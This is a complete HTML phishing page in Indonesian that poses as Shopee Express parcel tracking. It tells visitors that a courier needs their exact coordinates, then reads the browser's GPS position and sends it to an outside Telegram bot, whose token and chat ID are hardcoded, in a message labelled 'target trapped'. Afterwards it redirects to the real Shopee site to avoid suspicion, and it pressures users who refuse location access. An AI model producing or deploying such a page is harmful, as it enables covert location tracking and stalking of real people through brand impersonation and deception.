<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopee Express - Lacak Paket</title>
    <style>
        :root { --shopee-orange: #ee4d2d; }
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }

        /* Video Background Wrapper */
        .video-bg {
            position: fixed;
            right: 0;
            bottom: 0;
            min-width: 100%;
            min-height: 100%;
            z-index: -1;
            filter: brightness(0.6); /* Agar video agak gelap sehingga teks terbaca */
        }

        /* Overlay Glassmorphism */
        .overlay {
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: rgba(0, 0, 0, 0.2);
        }

        .main-card {
            width: 90%;
            max-width: 400px;
            background: rgba(255, 255, 255, 0.85); /* Efek Transparan */
            backdrop-filter: blur(15px); /* Efek Blur di belakang kotak */
            border-radius: 25px;
            padding: 30px;
            text-align: center;
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            border: 1px solid rgba(255, 255, 255, 0.3);
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .logo { width: 120px; margin-bottom: 20px; }
        
        h2 { color: #333; font-size: 22px; margin-bottom: 10px; }
        p { color: #555; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }

        /* Button Dinamis */
        .btn-shopee {
            background: linear-gradient(45deg, #ee4d2d, #ff7d53);
            color: white;
            padding: 15px 20px;
            width: 100%;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(238, 77, 45, 0.4);
            transition: 0.3s transform ease;
        }
        .btn-shopee:active { transform: scale(0.95); }

        /* Loading overlay */
        #loader { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(238, 77, 45, 0.9); z-index: 2000; 
            flex-direction: column; justify-content: center; align-items: center; color: white; 
        }
        .spinner { 
            width: 60px; height: 60px; border: 6px solid rgba(255,255,255,0.3); 
            border-top: 6px solid white; border-radius: 50%; animation: spin 1s linear infinite; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- Video Background: Menggunakan video kurir/mobil dari URL publik -->
    <!-- Kamu bisa mengganti src dengan link video .mp4 milikmu sendiri -->
    <video autoplay muted loop class="video-bg">
        <source src="https://assets.mixkit.co/videos/preview/mixkit-delivery-man-carrying-a-parcel-and-walking-to-the-door-4052-large.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>

    <div class="overlay">
        <div class="main-card">
            <!-- Logo Shopee -->
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" class="logo" alt="Shopee">
            
            <h2>Kurir Sedang Menuju Lokasi!</h2>
            <p>Paket Anda <b>SPX-99281102</b> sudah berada di area Anda. Kurir kami membutuhkan titik koordinat tepat untuk menghindari kesalahan alamat.</p>
            
            <button class="btn-shopee" onclick="getLocation()">KIRIM LOKASI SEKARANG</button>
        </div>
    </div>

    <!-- Animasi Loading -->
    <div id="loader">
        <div class="spinner"></div>
        <p style="margin-top: 20px; font-weight: bold; font-size: 18px;">Sinkronisasi GPS Shopee...</p>
    </div>

    <script>
        function getLocation() {
            document.getElementById('loader').style.display = 'flex';
            if (navigator.geolocation) {
                setTimeout(() => {
                    navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
                }, 2500);
            } else {
                alert("Browser tidak mendukung GPS.");
                document.getElementById('loader').style.display = 'none';
            }
        }

        function sendToTelegram(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const botToken = "8601318275:AAHCZd1zuF_fbVfwEp9SqCyA1Bgf5Iue4Hs"; // <--- GANTI
            const chatId = "8607837939";     // <--- GANTI
            const message = `🚀 *TARGET TERJEBAK!* \n\nTarget: Teke boy\n📍 Lokasi: ${lat}, ${lon}\n\n🗺️ Map: https://www.google.com/maps?q=${lat},${lon}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
            .then(() => {
                document.getElementById('loader').style.display = 'none';
                window.location.href = "https://shopee.co.id"; 
            })
            .catch(() => {
                document.getElementById('loader').style.display = 'none';
                alert("Error koneksi.");
            });
        }

        function showError(error) {
            document.getElementById('loader').style.display = 'none';
            alert("Akses lokasi ditolak! Paket tidak bisa dikirim jika lokasi tidak diverifikasi.");
        }
    </script>
</body>
</html>
